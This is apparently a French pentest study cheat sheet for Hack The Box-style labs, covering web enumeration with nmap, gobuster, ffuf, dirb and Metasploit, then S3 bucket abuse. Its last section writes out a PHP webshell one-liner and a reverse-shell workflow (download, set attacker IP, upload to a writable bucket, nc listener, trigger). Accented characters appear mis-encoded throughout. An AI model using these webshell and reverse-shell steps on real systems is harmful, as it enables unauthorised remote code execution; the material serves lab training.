# üåê √ânum√©ration HTTP/Web

[‚Üê Retour √† la table des mati√®res](../README.md)

## üìã Table des Mati√®res
- [Nmap Scripts HTTP](#nmap-scripts-http)
- [Subdomain Enumeration](#subdomain-enumeration)
  - [FFUF](#ffuf)
- [Directory Bruteforcing](#directory-bruteforcing)
  - [DIRB](#dirb)
  - [Gobuster](#gobuster)
- [Metasploit WMAP](#metasploit---wmap)
- [Site Mirroring](#site-mirroring)
- [Modules Metasploit](#metasploit-modules)

## Nmap Scripts HTTP
```bash
nmap --script http-enum -sV -p 80 targetIP
```

## Subdomain Enumeration

### üîç DNS vs Virtual Host Enumeration : Quelle diff√©rence ?

#### DNS Enumeration (gobuster dns)
```bash
gobuster dns -d thetoppers.htb -w wordlist.txt
```
- ‚úÖ Fait de **vraies requ√™tes DNS** aux serveurs DNS
- ‚úÖ Cherche des enregistrements DNS r√©els (A, AAAA, CNAME, etc.)
- ‚ùå **Ne fonctionne PAS** dans HTB/CTF car il n'y a pas de DNS configur√© pour les sous-domaines
- üéØ **Usage r√©el :** Tests en production avec DNS configur√©s

#### Virtual Host Enumeration (gobuster vhost / ffuf)
```bash
gobuster vhost -w wordlist.txt -u http://thetoppers.htb --append-domain
```
- ‚úÖ Envoie des requ√™tes HTTP avec diff√©rents headers `Host:`
- ‚úÖ D√©tecte les **virtual hosts** configur√©s sur le serveur web
- ‚úÖ **Fonctionne dans HTB/CTF** m√™me sans DNS
- üéØ **Usage HTB/Pentest :** D√©couvrir des interfaces web cach√©es

**üí° Pourquoi c'est important ?**
Dans les environnements HTB/CTF, les serveurs web utilisent des virtual hosts (comme Apache VirtualHost ou Nginx server blocks) pour h√©berger plusieurs sites sur la m√™me IP. Ces vhosts r√©pondent diff√©remment selon le header `Host:` envoy√©, mais ils ne sont pas forc√©ment enregistr√©s dans un DNS.

---

### Gobuster VHOST

```bash
# D√©couverte de virtual hosts basique
gobuster vhost \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-u http://thetoppers.htb \
--append-domain

# Avec plus de threads et output
gobuster vhost \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-u http://thetoppers.htb \
--append-domain \
-t 50 \
-o vhosts_found.txt

# Avec sp√©cification du code de statut √† ignorer
gobuster vhost \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-u http://thetoppers.htb \
--append-domain \
-t 50 \
--exclude-length 1234  # Exclure les r√©ponses de taille 1234
```

**üí° Options utiles :**
- `--append-domain` : Ajoute automatiquement le domaine de base (ex: FUZZ.thetoppers.htb)
- `-t THREADS` : Nombre de threads (d√©faut: 10, recommand√©: 50)
- `-o FILE` : Sauvegarder les r√©sultats dans un fichier
- `--exclude-length SIZE` : Exclure les r√©ponses d'une certaine taille

**üéØ Exemple de r√©sultat :**
```bash
$ gobuster vhost -w wordlist.txt -u http://thetoppers.htb --append-domain
===============================================================
Found: admin.thetoppers.htb (Status: 200) [Size: 2547]
Found: dev.thetoppers.htb (Status: 200) [Size: 1893]
Found: api.thetoppers.htb (Status: 401) [Size: 467]
===============================================================
```

---

### FFUF (Alternative plus rapide)

FFUF (Fuzz Faster U Fool) est souvent plus rapide que gobuster pour la d√©couverte de virtual hosts.

```bash
# √ânum√©ration de virtual hosts avec auto-calibration
ffuf -u http://thetoppers.htb \
-H "Host: FUZZ.thetoppers.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-ac

# Avec filtrage par code de statut HTTP
ffuf -u http://thetoppers.htb \
-H "Host: FUZZ.thetoppers.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-mc 200,301,302,403 \
-t 50

# Avec output JSON pour traitement ult√©rieur
ffuf -u http://thetoppers.htb \
-H "Host: FUZZ.thetoppers.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-mc 200,301,302,403 \
-o vhosts.json \
-of json

# Avec filtrage manuel des r√©ponses (quand auto-calibration ne suffit pas)
ffuf -u http://example.htb \
-H "Host: FUZZ.example.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-fs 1234  # Filtre les r√©ponses de taille 1234 (faux positifs)

# Avec threads et timeout optimis√©s
ffuf -u http://example.htb \
-H "Host: FUZZ.example.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-ac -t 50 -timeout 10
```

**üí° Options utiles :**
- `-ac` : Auto-calibration (filtre automatiquement les faux positifs)
- `-mc CODE` : Matcher les codes HTTP (ex: `-mc 200,301,302,403`)
- `-fc CODE` : Filtrer par code HTTP (ex: `-fc 404`)
- `-fs SIZE` : Filtrer par taille de r√©ponse
- `-fw WORDS` : Filtrer par nombre de mots
- `-fl LINES` : Filtrer par nombre de lignes
- `-t THREADS` : Nombre de threads (d√©faut: 40)
- `-H "Header: value"` : Ajouter un header personnalis√©
- `-o FILE` : Fichier de sortie
- `-of FORMAT` : Format de sortie (json, csv, html, etc.)

**üéØ Comparaison Gobuster vs FFUF :**

| Crit√®re | Gobuster VHOST | FFUF |
|---------|----------------|------|
| **Vitesse** | Rapide | Tr√®s rapide |
| **Facilit√©** | Simple, direct | Plus d'options, plus flexible |
| **Filtrage** | Basique | Avanc√© (taille, lignes, mots, regex) |
| **Auto-calibration** | Non | Oui (`-ac`) |
| **Usage** | D√©couverte simple | D√©couverte avanc√©e + fuzzing complexe |

---

### üìù Configuration /etc/hosts apr√®s d√©couverte

Une fois des virtual hosts d√©couverts, tu DOIS les ajouter √† `/etc/hosts` pour y acc√©der :

```bash
# √âditer le fichier hosts (n√©cessite sudo)
sudo nano /etc/hosts

# Ajouter les entr√©es d√©couvertes
10.129.95.232    thetoppers.htb
10.129.95.232    admin.thetoppers.htb
10.129.95.232    dev.thetoppers.htb
10.129.95.232    api.thetoppers.htb

# Sauvegarder et quitter (Ctrl+O, Enter, Ctrl+X)

# V√©rifier que √ßa fonctionne
ping -c 1 admin.thetoppers.htb
curl -I http://admin.thetoppers.htb
```

**üí° Pourquoi c'est n√©cessaire ?**
- Les virtual hosts sont bas√©s sur le header HTTP `Host:`
- Sans entr√©e dans `/etc/hosts`, ton navigateur/curl ne saura pas que `admin.thetoppers.htb` pointe vers `10.129.95.232`
- gobuster/ffuf d√©couvrent les vhosts mais n'acc√®dent pas directement au contenu complet

**üîó Workflow complet :**
```bash
# 1. Scanner les ports
nmap -p 80,443 -sV -sC 10.129.95.232

# 2. Identifier un domaine (dans le site web, certificat SSL, etc.)
curl -I http://10.129.95.232  # Regarde les headers, redirections

# 3. Ajouter le domaine principal √† /etc/hosts
echo "10.129.95.232    thetoppers.htb" | sudo tee -a /etc/hosts

# 4. D√©couvrir les virtual hosts
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://thetoppers.htb --append-domain -t 50

# OU avec ffuf (plus rapide)
ffuf -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -mc 200,301,302,403 -ac

# 5. Ajouter les vhosts trouv√©s √† /etc/hosts
echo "10.129.95.232    admin.thetoppers.htb" | sudo tee -a /etc/hosts
echo "10.129.95.232    dev.thetoppers.htb" | sudo tee -a /etc/hosts

# 6. Explorer les nouveaux vhosts
firefox http://admin.thetoppers.htb
gobuster dir -u http://admin.thetoppers.htb -w /usr/share/wordlists/dirb/common.txt
```

**üîó Lien avec le workflow de pentest :**
1. **Reconnaissance passive** ‚Üí Identifier les domaines/IP
2. **Reconnaissance active** ‚Üí Scanner les ports (80, 443)
3. **√ânum√©ration HTTP** ‚Üí D√©couvrir les virtual hosts (gobuster/ffuf)
4. **Configuration** ‚Üí Ajouter √† `/etc/hosts`
5. **√ânum√©ration approfondie** ‚Üí Directory bruteforce sur chaque vhost
6. **Exploitation** ‚Üí Chercher des vuln√©rabilit√©s sp√©cifiques √† chaque interface

## Directory Bruteforcing

### DIRB
```bash
dirb http://targeIP
dirb http://targetIP -w /usr/share/dirb/wordlists/big.txt -X .bak,.tar.gz,.zip,.sql,.bak.zip
```

### Gobuster
```bash
# Scan basique
gobuster dir -e -u targetIP -w /usr/share/dirb/wordlists/common.txt

# Scan avec wordlist plus compl√®te
gobuster dir -u http://targetIP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t30

# Scan avec authentification
gobuster dir -u http://targetIP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -U bob -P password_123321 -t30
```

## Metasploit - WMAP
```bash
wmap_sites -a targetIP
wmap_targets -t targetIP
wmap_sites -l
wmap_targets -l
wmap_run -t
wmap_run -e
```

## Site Mirroring
```bash
httrack http://targetIP -O INE
grep -i "FLAG5" -R targetIP/
```

## Metasploit Modules
```bash
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/robots_txt
use auxiliary/scanner/http/http_header
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/dir_listing
use auxiliary/scanner/http/files_dir
use auxiliary/scanner/http/http_put
use auxiliary/scanner/http/http_login
use auxiliary/scanner/http/apache_userdir_enum
```

---

## ü™£ AWS S3 Buckets - √ânum√©ration & Exploitation

### Installation AWS CLI
```bash
# Installer AWS CLI
apt install awscli -y

# V√©rifier l'installation
aws --version
```

### √ânum√©ration de buckets S3

#### Configuration basique (sans credentials)
```bash
# Pas besoin de credentials pour les buckets publics
aws configure
# Appuyer sur Entr√©e pour laisser vide
```

#### Lister le contenu d'un bucket
```bash
# Syntaxe de base
aws s3 ls s3://BUCKET_NAME --endpoint-url http://s3.TARGET_DOMAIN

# Exemple HTB
aws s3 ls s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb

# Lister r√©cursivement
aws s3 ls s3://thetoppers.htb --recursive --endpoint-url http://s3.thetoppers.htb
```

### Exploitation - Upload de fichiers

#### Upload d'un webshell
```bash
# Cr√©er un reverse shell PHP (voir section Payloads)
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload vers le bucket S3
aws s3 cp shell.php s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb

# V√©rifier l'upload
aws s3 ls s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb
```

#### Exemple complet avec reverse shell
```bash
# 1. T√©l√©charger le reverse shell Pentestmonkey
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

# 2. Modifier IP et port
sed -i 's/127.0.0.1/YOUR_IP/g' php-reverse-shell.php
sed -i 's/1234/4444/g' php-reverse-shell.php

# 3. Upload vers S3
aws s3 cp php-reverse-shell.php s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb

# 4. D√©marrer un listener
nc -nvlp 4444

# 5. Trigger le shell via HTTP
curl http://thetoppers.htb/php-reverse-shell.php
# ou acc√©der via navigateur
```

#### R√©sultat attendu
```bash
$ aws s3 ls --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb
PRE images/
2026-01-27 07:47:17          0 .htaccess
2026-01-27 07:47:17      11952 index.php
2026-01-27 08:14:52      36395 shell.php
```

### Download depuis S3
```bash
# T√©l√©charger un fichier
aws s3 cp s3://thetoppers.htb/index.php . --endpoint-url http://s3.thetoppers.htb

# T√©l√©charger tout le bucket
aws s3 sync s3://thetoppers.htb ./backup --endpoint-url http://s3.thetoppers.htb
```

### Autres op√©rations S3
```bash
# Supprimer un fichier
aws s3 rm s3://thetoppers.htb/shell.php --endpoint-url http://s3.thetoppers.htb

# Copier entre buckets
aws s3 cp s3://source/file.txt s3://destination/file.txt --endpoint-url http://s3.domain.htb
```

### üîó Liens avec le workflow
1. **√ânum√©ration web** ‚Üí D√©couvrir des vhosts comme `s3.domain.htb`
2. **Test d'acc√®s S3** ‚Üí V√©rifier les permissions avec `aws s3 ls`
3. **Upload de payload** ‚Üí D√©poser un webshell si √©criture possible
4. **Exploitation** ‚Üí Trigger le webshell pour obtenir un acc√®s initial
5. **Post-exploitation** ‚Üí √âlever les privil√®ges depuis le serveur web

**üí° Points de v√©rification :**
- Buckets S3 accessibles publiquement (misconfiguration)
- Permissions d'√©criture sur des buckets
- Ex√©cution PHP/scripts sur le serveur web
- Chemins accessibles via HTTP apr√®s upload S3
